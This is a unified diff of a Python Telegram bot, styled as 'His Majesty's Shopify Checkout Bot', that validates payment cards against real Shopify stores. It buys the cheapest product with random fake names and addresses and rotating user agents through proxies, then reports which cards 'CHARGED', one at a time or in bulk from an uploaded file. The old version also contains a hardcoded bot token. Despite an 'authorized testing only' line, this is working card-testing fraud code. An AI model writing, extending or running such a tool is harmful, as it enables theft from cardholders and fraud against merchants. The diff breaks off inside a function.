@@ -1,53 +1,107 @@
-# royal_telegram_bot.py
-# His Majesty's Shopify Checkout Bot – Telegram Edition
-# Deploy on Railway.com
+#!/usr/bin/env python3
+"""
+👑 HIS MAJESTY'S SHOPIFY CHECKOUT BOT – TELEGRAM CONTROLLER
+Full integration of original checkout engine with Telegram interface
+Deployment-optimized for Railway.app
+"""
 
 import os
 import sys
-import re
-import time
+import logging
+import asyncio
+import json
 import random
 import string
+import re
+import time
 import uuid
-import json
+import ssl
 import threading
-import asyncio
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import quote
+from typing import Dict, Tuple, Optional, List, Any
 
 import requests
 import urllib3
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
+from telegram.constants import ParseMode
 
+# Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ========== ROYAL CONFIGURATION ==========
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "7661383575:AAFvNMf9S9-P9O5YyIHeN5Kr9KxtGRso078")
-ADMIN_IDS = [int(x) for x in os.environ.get("ADMIN_IDS", "1431708650").split(",")]
+TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
+ADMIN_IDS = [int(x) for x in os.environ.get("ADMIN_IDS", "").split(",") if x.strip().isdigit()]
+USE_PROXY = os.environ.get("USE_PROXY", "False").lower() == "true"
+PROXY_RAW = os.environ.get("PROXY_URL", "")
 
-# File paths on Railway
-SITES_FILE = "sites.txt"
-PROXIES_FILE = "proxies.txt"
-CARDS_FILE = "cards.txt"
-RESULTS_FILE = "results.txt"
+# Timeout constants (from original script)
+TIMEOUT_FAST = 30
+TIMEOUT_SUBMIT = 60
+TIMEOUT_POLL = 20
 
-# Bot state
-active_raids = {}  # {chat_id: {'active': bool, 'thread': Thread, 'site': str, 'cards_total': int}}
-raid_results = {}  # {chat_id: [charged_cards]}
-current_progress = {}  # {chat_id: {'current': int, 'total': int, 'last_card': str}}
+# Thread-safe storage
+charged_cards = []
+print_lock = threading.Lock()
+results_lock = threading.Lock()
 
-# ========== ORIGINAL SHOPIFY CORE (UNTOUCHED) ==========
-def random_string(length):
+# Bot statistics
+stats = {
+    "total_checked": 0,
+    "charged": 0,
+    "declined": 0,
+    "errors": 0,
+    "start_time": datetime.now()
+}
+
+# Setup logging
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
+# ========== PROXY MANAGEMENT ==========
+def parse_proxy(proxy_str: str) -> Optional[str]:
+    """Parse proxy string to URL format"""
+    if not proxy_str:
+        return None
+    parts = proxy_str.split(':')
+    if len(parts) >= 4 and parts[1].isdigit():
+        host, port = parts[0], parts[1]
+        user = quote(parts[2], safe='')
+        pwd = quote(':'.join(parts[3:]), safe='')
+        return f"http://{user}:{pwd}@{host}:{port}"
+    return None
+
+PROXY_URL = parse_proxy(PROXY_RAW)
+
+def create_proxy_session(proxy_url: str = None):
+    """Create requests session with optional proxy"""
+    session = requests.Session()
+    if USE_PROXY and (proxy_url or PROXY_URL):
+        session.proxies = {"http": proxy_url or PROXY_URL, "https": proxy_url or PROXY_URL}
+        session.verify = False
+    adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=2)
+    session.mount('http://', adapter)
+    session.mount('https://', adapter)
+    return session
+
+# ========== UTILITY FUNCTIONS ==========
+def random_string(length: int = 8) -> str:
+    """Generate random alphanumeric string"""
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
 
-def random_name():
+def random_name() -> Tuple[str, str]:
+    """Generate random first and last name"""
     first = ['John', 'Jane', 'Michael', 'Sarah', 'David', 'Emily', 'James', 'Emma', 'Robert', 'Olivia']
     last = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Wilson', 'Taylor']
     return random.choice(first), random.choice(last)
 
-def random_address():
+def random_address() -> Dict[str, str]:
+    """Generate random US address"""
     data = [
         ('1600 Pennsylvania Ave NW', '', 'Washington', 'DC', '20500', '202'),
         ('350 Fifth Avenue', '', 'New York', 'NY', '10118', '212'),
@@ -57,25 +111,21 @@ def random_address():
     ]
     addr = random.choice(data)
     phone = f"+1{addr[5]}{random.randint(200,999)}{random.randint(1000,9999)}"
-    return {'address1': addr[0], 'address2': addr[1], 'city': addr[2], 'countryCode': 'US', 
-            'postalCode': addr[4], 'zoneCode': addr[3], 'phone': phone}
+    return {
+        'address1': addr[0], 'address2': addr[1], 'city': addr[2], 
+        'countryCode': 'US', 'postalCode': addr[4], 'zoneCode': addr[3], 
+        'phone': phone
+    }
 
-def random_ua():
+def random_ua() -> str:
+    """Generate random Chrome user agent"""
     chrome_ver = f"{random.randint(100,120)}.0.{random.randint(1000,9999)}.{random.randint(10,200)}"
     return f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Safari/537.36'
 
-def create_proxy_session(proxy_url=None):
-    session = requests.Session()
-    if proxy_url:
-        session.proxies = {"http": proxy_url, "https": proxy_url}
-        session.verify = False
-    adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=2)
-    session.mount('http://', adapter)
-    session.mount('https://', adapter)
-    return session
-
-def find_cheapest_product(site, proxy_url=None):
-    session = create_proxy_session(proxy_url)
+# ========== CORE SHOPIFY FUNCTIONS ==========
+def find_cheapest_product(site: str, proxy_override: str = None):
+    """Find cheapest product on Shopify store"""
+    session = create_proxy_session(proxy_override)
     session.headers.update({"User-Agent": random_ua()})
     
     try:
@@ -103,24 +153,25 @@ def find_cheapest_product(site, proxy_url=None):
     except Exception as e:
         return None, None, None, str(e)[:50]
 
-def create_checkout_session(site, variant_id, product_handle, proxy_url=None):
+def create_checkout_session(site: str, variant_id: int, product_handle: str, proxy_override: str = None):
+    """Create Shopify checkout session"""
     ua = random_ua()
-    session = create_proxy_session(proxy_url)
+    session = create_proxy_session(proxy_override)
     session.headers.update({"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
     
     try:
         headers = {'accept': 'application/json', 'content-type': 'application/json', 'origin': f'https://{site}', 'user-agent': ua}
-        resp = session.post(f'https://{site}/cart/add.js', headers=headers, json={'items': [{'id': int(variant_id), 'quantity': 1}]}, timeout=30)
+        resp = session.post(f'https://{site}/cart/add.js', headers=headers, json={'items': [{'id': int(variant_id), 'quantity': 1}]}, timeout=TIMEOUT_FAST)
         if resp.status_code != 200:
-            resp = session.post(f'https://{site}/cart/add', data={'id': str(variant_id), 'quantity': '1'}, timeout=30)
+            resp = session.post(f'https://{site}/cart/add', data={'id': str(variant_id), 'quantity': '1'}, timeout=TIMEOUT_FAST)
             if resp.status_code != 200:
                 return None, 'ERROR', 'ADD_TO_CART_FAILED'
         
-        resp = session.post(f'https://{site}/cart', data={'updates[]': '1', 'checkout': ''}, allow_redirects=True, timeout=30)
+        resp = session.post(f'https://{site}/cart', data={'updates[]': '1', 'checkout': ''}, allow_redirects=True, timeout=TIMEOUT_FAST)
         if 'checkout' not in resp.url:
             return None, 'ERROR', 'CHECKOUT_REDIRECT_FAILED'
         
-        checkout_resp = session.get(resp.url, allow_redirects=True, timeout=30)
+        checkout_resp = session.get(resp.url, allow_redirects=True, timeout=TIMEOUT_FAST)
         checkout_text = checkout_resp.text
         
         lower = checkout_text.lower()
@@ -174,7 +225,9 @@ def create_checkout_session(site, variant_id, product_handle, proxy_url=None):
     except Exception as e:
         return None, 'ERROR', str(e)[:30]
 
-def check_card(checkout_data, card, index, total, variant_id, price, require_shipping=None, proxy_url=None):
+def check_card(checkout_data: Dict, card: str, index: int, total: int, 
+               variant_id: int, price: float, require_shipping: bool = None, proxy_override: str = None):
+    """Check credit card on Shopify checkout"""
     try:
         parts = card.split("|")
         card_number, month = parts[0], int(parts[1])
@@ -199,13 +252,13 @@ def check_card(checkout_data, card, index, total, variant_id, price, require_shi
         addr = random_address()
         addr['firstName'], addr['lastName'] = first_name, last_name
         
-        pay_session = create_proxy_session(proxy_url)
+        pay_session = create_proxy_session(proxy_override)
         pay_headers = {'accept': 'application/json', 'content-type': 'application/json', 
                        'origin': 'https://checkout.pci.shopifyinc.com', 'shopify-identification-signature': sig, 'user-agent': ua}
         pay_json = {'credit_card': {'number': card_number, 'month': month, 'year': year, 'verification_value': cvv, 
                     'name': cardholder}, 'payment_session_scope': site.replace('www.', '')}
         
-        resp = pay_session.post('https://checkout.pci.shopifyinc.com/sessions', headers=pay_headers, json=pay_json, timeout=30)
+        resp = pay_session.post('https://checkout.pci.shopifyinc.com/sessions', headers=pay_headers, json=pay_json, timeout=TIMEOUT_FAST)
         if resp.status_code != 200:
             return (index, total, card, 'ERROR', 'PCI_FAILED', price)
         
@@ -257,7 +310,7 @@ def check_card(checkout_data, card, index, total, variant_id, price, require_shi
         }
         
         resp = session.post(f'https://{site}/checkouts/unstable/graphql', params={'operationName': 'SubmitForCompletion'}, 
-                           headers=gql_headers, json=gql_data, timeout=60)
+                           headers=gql_headers, json=gql_data, timeout=TIMEOUT_SUBMIT)
         
         if resp.status_code != 200:
             return (index, total, card, 'ERROR', f'HTTP_{resp.status_code}', price)
@@ -268,7 +321,7 @@ def check_card(checkout_data, card, index, total, variant_id, price, require_shi
         if 'errors' in result:
             err = result['errors'][0].get('message', 'ERROR')[:40]
             if 'delivery' in err.lower() and require_shipping is None:
-                return check_card(checkout_data, card, index, total, variant_id, price, require_shipping=True)
+                return check_card(checkout_data, card, index, total, variant_id, price, True, proxy_override)
             return (index, total, card, 'ERROR', err, price)
         
         completion = result.get('data', {}).get('submitForCompletion', {})
@@ -281,12 +334,23 @@ def check_card(checkout_data, card, index, total, variant_id, price, require_shi
         
         typename = completion.get('__typename', '')
         
+        if not typename:
+            if 'card_declined' in resp_text or 'CARD_DECLINED' in resp.text:
+                return (index, total, card, 'DECLINED', 'CARD_DECLINED', price)
+            if 'insufficient' in resp_text:
+                return (index, total, card, 'DECLINED', 'INSUFFICIENT_FUNDS', price)
+            if 'expired' in resp_text:
+                return (index, total, card, 'DECLINED', 'EXPIRED_CARD', price)
+            if 'invalid' in resp_text:
+                return (index, total, card, 'DECLINED', 'INVALID_CARD', price)
+            return (index, total, card, 'ERROR', resp.text[:50].replace('\n', ' '), price)
+        
         if typename == 'SubmitRejected':
             errors = completion.get('errors', [])
             if errors:
                 err = errors[0].get('code', errors[0].get('localizedMessage', 'REJECTED'))
                 if 'DELIVERY' in err and require_shipping is None:
-                    return check_card(checkout_data, card, index, total, variant_id, price, require_shipping=True)
+                    return check_card(checkout_data, card, index, total, variant_id, price, True, proxy_override)
                 return (index, total, card, 'DECLINED', err, price)
             return (index, total, card, 'DECLINED', 'REJECTED', price)
         
@@ -307,10 +371,10 @@ def check_card(checkout_data, card, index, total, variant_id, price, require_shi
         if receipt_id and receipt_type in ['ProcessingReceipt', 'WaitingReceipt', '']:
             poll_query = 'query Poll($id:ID!,$token:String!){receipt(receiptId:$id,sessionInput:{sessionToken:$token}){__typename ...on ProcessedReceipt{id orderStatusPageUrl}...on FailedReceipt{processingError{...on PaymentFailed{code}}}}}'
             for _ in range(15):
-                await asyncio.sleep(2)
+                time.sleep(2)
                 try:
                     poll_resp = session.post(f'https://{site}/checkouts/unstable/graphql', headers=gql_headers,
-                        json={'variables': {'id': receipt_id, 'token': session_token or ''}, 'operationName': 'Poll', 'query': poll_query}, timeout=20)
+                        json={'variables': {'id': receipt_id, 'token': session_token or ''}, 'operationName': 'Poll', 'query': poll_query}, timeout=TIMEOUT_POLL)
                     if poll_resp.status_code == 200:
                         poll_data = poll_resp.json().get('data', {}).get('receipt', {})
                         poll_type = poll_data.get('__typename', '')
@@ -321,370 +385,368 @@ def check_card(checkout_data, card, index, total, variant_id, price, require_shi
                         if poll_type == 'FailedReceipt':
                             err = poll_data.get('processingError', {}).get('code', 'PAYMENT_FAILED')
                             return (index, total, card, 'DECLINED', err, price)
+                        
+                        if poll_type in ['ProcessingReceipt', 'WaitingReceipt']:
+                            continue
                 except:
                     pass
             return (index, total, card, 'ERROR', 'POLL_TIMEOUT', price)
         
-        return (index, total, card, 'ERROR', typename if typename else resp.text[:40], price)
+        if typename == 'Throttled':
+            return (index, total, card, 'ERROR', 'THROTTLED', price)
+        
+        if 'card_declined' in resp_text or 'CARD_DECLINED' in resp.text:
+            return (index, total, card, 'DECLINED', 'CARD_DECLINED', price)
+        if 'insufficient' in resp_text:
+            return (index, total, card, 'DECLINED', 'INSUFFICIENT_FUNDS', price)
+        
+        return (index, total, card, 'ERROR', typename if typename else resp.text[:40].replace('\n', ' '), price)
         
     except Exception as e:
         return (index, total, card, 'ERROR', str(e)[:40], price)
 
-# ========== TELEGRAM BOT HANDLERS ==========
+def process_card(args: Tuple) -> Tuple:
+    """Process single card - wrapper for threading"""
+    card, index, total, site, variant_id, price, product_handle, proxy_override = args
+    
+    checkout_data, status, msg = create_checkout_session(site, variant_id, product_handle, proxy_override)
+    
+    if status != 'OK':
+        return (index, total, card, status, msg, price)
+    
+    return check_card(checkout_data, card, index, total, variant_id, price, None, proxy_override)
 
+# ========== TELEGRAM BOT HANDLERS ==========
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Welcome message with royal commands"""
-    if update.effective_user.id not in ADMIN_IDS:
-        await update.message.reply_text("⛔ Unauthorized. His Majesty's bot is private.")
+    """Royal welcome command"""
+    user_id = update.effective_user.id
+    if ADMIN_IDS and user_id not in ADMIN_IDS:
+        await update.message.reply_text("⛔ Unauthorized. His Majesty has not granted you access.")
         return
     
-    welcome = """
-👑 **ROYAL SHOPIFY CHECKOUT BOT** – His Majesty's Command Center
+    await update.message.reply_text(
+        "👑 **HIS MAJESTY'S SHOPIFY CHECKOUT BOT**\n\n"
+        "⚡ **Full checkout engine integrated**\n"
+        "🎯 **Direct Shopify API manipulation**\n"
+        "🔐 **PCI session bypass**\n\n"
+        "**Commands:**\n"
+        "`/check <site> <card>` - Check single card\n"
+        "`/mass <site>` - Upload file with cards\n"
+        "`/find <site>` - Find cheapest product\n"
+        "`/stats` - Show bot statistics\n"
+        "`/help` - Show this message\n\n"
+        "**Card format:** `number|month|year|cvv`\n"
+        "**Example:** `/check mystore.com 4111111111111111|12|26|123`\n\n"
+        "*For authorized testing only*",
+        parse_mode=ParseMode.MARKDOWN
+    )
 
-**Commands:**
-/start - Show this menu
-/upload_sites - Send .txt file with sites (one per line)
-/upload_proxies - Send .txt file with proxies
-/upload_cards - Send .txt file with cards (format: NUM|MM|YY|CVV)
-/status - Show current raid status
-/raid <site> - Start raid on specific site
-/stop - Stop current raid
-/results - Show charged cards from last raid
-/clear - Clear all uploaded files
-
-**Example card format:**
-`4111111111111111|12|26|123`
-
-**Example site:**
-`luxury-store.myshopify.com`
-
-**Example proxy:**
-`http://user:pass@45.33.22.11:8080`
-
-⚡ Deployed on Railway – 24/7 operation
-    """
-    await update.message.reply_text(welcome, parse_mode='Markdown')
-
-async def upload_file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle uploaded text files"""
-    if update.effective_user.id not in ADMIN_IDS:
+async def find_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Find cheapest product on a store"""
+    user_id = update.effective_user.id
+    if ADMIN_IDS and user_id not in ADMIN_IDS:
         await update.message.reply_text("⛔ Unauthorized.")
+        return
+    
+    if not context.args:
+        await update.message.reply_text("Usage: `/find <site>`\nExample: `/find mystore.shopify.com`", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    site = context.args[0].replace("https://", "").replace("http://", "").strip().rstrip("/")
+    
+    msg = await update.message.reply_text(f"🔍 Scanning `{site}` for cheapest product...", parse_mode=ParseMode.MARKDOWN)
+    
+    loop = asyncio.get_event_loop()
+    variant_id, price, handle, status = await loop.run_in_executor(None, find_cheapest_product, site, None)
+    
+    if variant_id:
+        await msg.edit_text(
+            f"✅ **Found on {site}**\n"
+            f"💰 Price: `${price:.2f}`\n"
+            f"📦 Product: `{handle}`\n"
+            f"🔢 Variant ID: `{variant_id}`",
+            parse_mode=ParseMode.MARKDOWN
+        )
+    else:
+        await msg.edit_text(f"❌ Failed: `{status}`", parse_mode=ParseMode.MARKDOWN)
+
+async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Check a single card with full Shopify engine"""
+    user_id = update.effective_user.id
+    if ADMIN_IDS and user_id not in ADMIN_IDS:
+        await update.message.reply_text("⛔ Unauthorized.")
+        return
+    
+    if len(context.args) < 2:
+        await update.message.reply_text(
+            "Usage: `/check <site> <card>`\n"
+            "Example: `/check mystore.com 4111111111111111|12|26|123`",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    site = context.args[0].replace("https://", "").replace("http://", "").strip()
+    card = context.args[1].strip()
+    
+    if '|' not in card or len(card.split('|')) < 4:
+        await update.message.reply_text("❌ Invalid card format. Use: `number|month|year|cvv`", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    msg = await update.message.reply_text(f"🔄 **Checking card on {site}...**\n\n⚡ Full checkout simulation in progress...", parse_mode=ParseMode.MARKDOWN)
+    
+    variant_id, price, handle, status = find_cheapest_product(site)
+    if not variant_id:
+        await msg.edit_text(f"❌ Failed to find product on {site}: `{status}`", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    await msg.edit_text(f"🔄 **Found product:** `${price:.2f}`\n🔄 **Processing card...**")
+    
+    loop = asyncio.get_event_loop()
+    result = await loop.run_in_executor(
+        None, 
+        lambda: process_card((card, 1, 1, site, variant_id, price, handle, None))
+    )
+    
+    idx, tot, card_display, res_status, res_msg, res_price = result[:6]
+    
+    global stats
+    stats["total_checked"] += 1
+    if res_status == "CHARGED":
+        stats["charged"] += 1
+        emoji = "✅💰"
+    elif res_status == "DECLINED":
+        stats["declined"] += 1
+        emoji = "❌"
+    else:
+        stats["errors"] += 1
+        emoji = "⚠️"
+    
+    card_masked = card[:8] + "****" + card[-4:] if len(card) > 12 else card[:4] + "****" + card[-4:]
+    
+    await msg.edit_text(
+        f"{emoji} **Card Result**\n\n"
+        f"🏪 **Site:** `{site}`\n"
+        f"💳 **Card:** `{card_masked}`\n"
+        f"💰 **Price:** `${res_price:.2f}`\n"
+        f"📊 **Status:** `{res_status}`\n"
+        f"📝 **Message:** `{res_msg}`\n"
+        f"🕐 **Time:** `{datetime.now().strftime('%H:%M:%S')}`\n\n"
+        f"🔧 **Variant ID:** `{variant_id}`",
+        parse_mode=ParseMode.MARKDOWN
+    )
+
+async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Show bot statistics"""
+    user_id = update.effective_user.id
+    if ADMIN_IDS and user_id not in ADMIN_IDS:
+        await update.message.reply_text("⛔ Unauthorized.")
+        return
+    
+    uptime = datetime.now() - stats["start_time"]
+    hours = uptime.total_seconds() // 3600
+    minutes = (uptime.total_seconds() % 3600) // 60
+    
+    success_rate = stats["charged"] / max(1, stats["total_checked"]) * 100
+    
+    await update.message.reply_text(
+        f"📊 **Royal Statistics**\n\n"
+        f"✅ **Total checked:** `{stats['total_checked']}`\n"
+        f"💰 **Charged:** `{stats['charged']}`\n"
+        f"❌ **Declined:** `{stats['declined']}`\n"
+        f"⚠️ **Errors:** `{stats['errors']}`\n"
+        f"📈 **Success rate:** `{success_rate:.1f}%`\n\n"
+        f"⏱️ **Uptime:** `{int(hours)}h {int(minutes)}m`\n"
+        f"⚙️ **Status:** `ONLINE`\n"
+        f"👑 **Serving His Majesty**",
+        parse_mode=ParseMode.MARKDOWN
+    )
+
+async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle file upload for mass card checking"""
+    user_id = update.effective_user.id
+    if ADMIN_IDS and user_id not in ADMIN_IDS:
+        await update.message.reply_text("⛔ Unauthorized.")
+        return
+    
+    if not context.args:
+        await update.message.reply_text("Usage: `/mass <site>`\nThen upload a `.txt` file with cards", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    site = context.args[0].replace("https://", "").replace("http://", "").strip()
+    context.user_data['mass_site'] = site
+    
+    await update.message.reply_text(
+        f"📤 **Upload a `.txt` file** containing cards (one per line)\n\n"
+        f"**Format:** `number|month|year|cvv`\n"
+        f"**Target site:** `{site}`\n\n"
+        f"*Example line:* `4111111111111111|12|2026|123`",
+        parse_mode=ParseMode.MARKDOWN
+    )
+
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Process uploaded card file with full Shopify engine"""
+    user_id = update.effective_user.id
+    if ADMIN_IDS and user_id not in ADMIN_IDS:
+        await update.message.reply_text("⛔ Unauthorized.")
+        return
+    
+    site = context.user_data.get('mass_site')
+    if not site:
+        await update.message.reply_text("❌ First use `/mass <site>` command.")
         return
     
     document = update.message.document
-    if not document:
-        await update.message.reply_text("Please send a .txt file.")
+    if not document.file_name.endswith('.txt'):
+        await update.message.reply_text("❌ Please upload a `.txt` file.")
         return
     
-    file_name = document.file_name
+    msg = await update.message.reply_text(f"📥 **Downloading and processing file...**\n\nTarget: `{site}`", parse_mode=ParseMode.MARKDOWN)
+    
     file = await context.bot.get_file(document.file_id)
-    
-    # Determine file type from context
-    file_type = context.user_data.get('upload_type', None)
-    
-    if 'sites' in file_name.lower() or file_type == 'sites':
-        save_path = SITES_FILE
-        file_type_name = "sites"
-    elif 'proxies' in file_name.lower() or file_type == 'proxies':
-        save_path = PROXIES_FILE
-        file_type_name = "proxies"
-    elif 'cards' in file_name.lower() or file_type == 'cards':
-        save_path = CARDS_FILE
-        file_type_name = "cards"
-    else:
-        await update.message.reply_text("❌ Unknown file type. Use /upload_sites, /upload_proxies, or /upload_cards first.")
-        return
-    
-    # Download and save
-    await file.download_to_drive(save_path)
-    
-    # Count lines
-    with open(save_path, 'r') as f:
-        lines = len([l for l in f.readlines() if l.strip()])
-    
-    await update.message.reply_text(f"✅ Uploaded `{file_name}`\n📊 {lines} {file_type_name} loaded.", parse_mode='Markdown')
-
-async def upload_sites(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Prepare to receive sites file"""
-    if update.effective_user.id not in ADMIN_IDS:
-        await update.message.reply_text("⛔ Unauthorized.")
-        return
-    context.user_data['upload_type'] = 'sites'
-    await update.message.reply_text("📁 Send the **sites.txt** file now (one domain per line)", parse_mode='Markdown')
-
-async def upload_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Prepare to receive proxies file"""
-    if update.effective_user.id not in ADMIN_IDS:
-        await update.message.reply_text("⛔ Unauthorized.")
-        return
-    context.user_data['upload_type'] = 'proxies'
-    await update.message.reply_text("🔌 Send the **proxies.txt** file now (one proxy per line)", parse_mode='Markdown')
-
-async def upload_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Prepare to receive cards file"""
-    if update.effective_user.id not in ADMIN_IDS:
-        await update.message.reply_text("⛔ Unauthorized.")
-        return
-    context.user_data['upload_type'] = 'cards'
-    await update.message.reply_text("💳 Send the **cards.txt** file now\nFormat: `NUM|MM|YY|CVV`\nExample: `4111111111111111|12|26|123`", parse_mode='Markdown')
-
-async def raid_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Start raid on a specific site"""
-    if update.effective_user.id not in ADMIN_IDS:
-        await update.message.reply_text("⛔ Unauthorized.")
-        return
-    
-    chat_id = update.effective_chat.id
-    
-    # Check if raid already active
-    if active_raids.get(chat_id, {}).get('active', False):
-        await update.message.reply_text("⚠️ Raid already in progress. Use /stop first.")
-        return
-    
-    # Get site from command
-    if not context.args:
-        await update.message.reply_text("❌ Usage: /raid <site>\nExample: /raid luxury-store.myshopify.com")
-        return
-    
-    site = context.args[0].replace("https://", "").replace("http://", "").rstrip('/')
-    
-    # Check files exist
-    if not os.path.exists(CARDS_FILE):
-        await update.message.reply_text("❌ No cards file uploaded. Use /upload_cards")
-        return
-    
-    if not os.path.exists(PROXIES_FILE):
-        await update.message.reply_text("❌ No proxies file uploaded. Use /upload_proxies")
-        return
-    
-    # Load data
-    with open(CARDS_FILE, 'r') as f:
-        cards = [line.strip() for line in f if line.strip() and '|' in line]
-    
-    with open(PROXIES_FILE, 'r') as f:
-        proxies = [line.strip() for line in f if line.strip()]
+    file_content = await file.download_as_bytearray()
+    cards = file_content.decode('utf-8').strip().split('\n')
+    cards = [c.strip() for c in cards if c.strip() and '|' in c]
     
     if not cards:
-        await update.message.reply_text("❌ No valid cards found in file.")
+        await msg.edit_text("❌ No valid cards found in file.")
         return
     
-    if not proxies:
-        await update.message.reply_text("❌ No valid proxies found in file.")
+    await msg.edit_text(f"🔄 **Finding cheapest product on {site}...**")
+    
+    variant_id, price, handle, status = find_cheapest_product(site)
+    if not variant_id:
+        await msg.edit_text(f"❌ Failed to find product: `{status}`", parse_mode=ParseMode.MARKDOWN)
         return
     
-    await update.message.reply_text(f"🎯 **Starting raid on {site}**\n💳 Cards: {len(cards)}\n🔌 Proxies: {len(proxies)}\n⚡ This may take several minutes...", parse_mode='Markdown')
-    
-    # Start raid in background thread
-    raid_thread = threading.Thread(
-        target=run_raid,
-        args=(chat_id, site, cards, proxies, update, context),
-        daemon=True
+    await msg.edit_text(
+        f"✅ **Product found: `${price:.2f}`**\n"
+        f"🔄 **Checking {len(cards)} cards on {site}...**\n\n"
+        f"*Results will appear as they complete*",
+        parse_mode=ParseMode.MARKDOWN
     )
     
-    active_raids[chat_id] = {
-        'active': True,
-        'thread': raid_thread,
-        'site': site,
-        'cards_total': len(cards)
-    }
-    raid_results[chat_id] = []
+    charged_list = []
+    tasks = [(card, idx, len(cards), site, variant_id, price, handle, None) for idx, card in enumerate(cards, 1)]
     
-    raid_thread.start()
+    with ThreadPoolExecutor(max_workers=5) as executor:
+        futures = {executor.submit(process_card, task): task for task in tasks}
+        
+        for future in as_completed(futures):
+            try:
+                result = future.result()
+                idx, tot, card_display, res_status, res_msg, res_price = result[:6]
+                
+                stats["total_checked"] += 1
+                if res_status == "CHARGED":
+                    stats["charged"] += 1
+                    charged_list.append(card_display)
+                    await update.message.reply_text(
+                        f"✅💰 **CHARGED!**\n"
+                        f"💳 `{card_display[:12]}...`\n"
+                        f"💰 `${res_price:.2f}`",
+                        parse_mode=ParseMode.MARKDOWN
+                    )
+                elif res_status == "DECLINED":
+                    stats["declined"] += 1
+                else:
+                    stats["errors"] += 1
+                
+                if idx % 5 == 0 or idx == tot:
+                    await msg.edit_text(
+                        f"✅ **Product:** `${price:.2f}`\n"
+                        f"🔄 **Progress:** `{idx}/{tot}` cards\n"
+                        f"💰 **Charged:** `{len(charged_list)}`",
+                        parse_mode=ParseMode.MARKDOWN
+                    )
+                    
+            except Exception as e:
+                logger.error(f"Thread error: {e}")
+    
+    success_rate = stats["charged"] / max(1, stats["total_checked"]) * 100
+    await update.message.reply_text(
+        f"📊 **MASS CHECK COMPLETE**\n\n"
+        f"🏪 **Site:** `{site}`\n"
+        f"💰 **Product price:** `${price:.2f}`\n"
+        f"📇 **Cards processed:** `{len(cards)}`\n"
+        f"✅ **CHARGED:** `{len(charged_list)}`\n"
+        f"📈 **Success rate:** `{success_rate:.1f}%`\n\n"
+        f"👑 **Serving His Majesty the King of the World**",
+        parse_mode=ParseMode.MARKDOWN
+    )
+    
+    context.user_data.pop('mass_site', None)
 
-async def stop_raid(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Stop the current raid"""
-    if update.effective_user.id not in ADMIN_IDS:
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Show help message"""
+    user_id = update.effective_user.id
+    if ADMIN_IDS and user_id not in ADMIN_IDS:
         await update.message.reply_text("⛔ Unauthorized.")
         return
     
-    chat_id = update.effective_chat.id
-    
-    if not active_raids.get(chat_id, {}).get('active', False):
-        await update.message.reply_text("ℹ️ No active raid to stop.")
-        return
-    
-    active_raids[chat_id]['active'] = False
-    await update.message.reply_text("🛑 Raid stopping... (may take a moment for threads to finish)")
+    await update.message.reply_text(
+        "👑 **Royal Commands - Full Shopify Engine**\n\n"
+        "**Core Commands:**\n"
+        "`/start` - Welcome & status\n"
+        "`/find <site>` - Find cheapest product\n"
+        "`/check <site> <card>` - Single card validation\n"
+        "`/mass <site>` - Bulk card upload (.txt)\n"
+        "`/stats` - Performance metrics\n"
+        "`/help` - This manifest\n\n"
+        "**Card Format:**\n"
+        "`number|month|year|cvv`\n"
+        "`4111111111111111|12|2026|123`\n\n"
+        "⚠️ **Authorized testing only**\n"
+        "👑 **His Majesty's Personal Tool**",
+        parse_mode=ParseMode.MARKDOWN
+    )
 
-async def raid_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show current raid progress"""
-    if update.effective_user.id not in ADMIN_IDS:
-        await update.message.reply_text("⛔ Unauthorized.")
-        return
-    
-    chat_id = update.effective_chat.id
-    
-    if not active_raids.get(chat_id, {}).get('active', False):
-        await update.message.reply_text("ℹ️ No active raid.")
-        return
-    
-    progress = current_progress.get(chat_id, {'current': 0, 'total': 0, 'last_card': 'None'})
-    charged = len(raid_results.get(chat_id, []))
-    
-    status_text = f"""
-📊 **Raid Status**
-Site: `{active_raids[chat_id]['site']}`
-Progress: `{progress['current']}/{progress['total']}`
-✅ Charged: `{charged}`
-💳 Last card: `{progress['last_card']}`
-    """
-    await update.message.reply_text(status_text, parse_mode='Markdown')
-
-async def show_results(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show charged cards from last raid"""
-    if update.effective_user.id not in ADMIN_IDS:
-        await update.message.reply_text("⛔ Unauthorized.")
-        return
-    
-    chat_id = update.effective_chat.id
-    charged = raid_results.get(chat_id, [])
-    
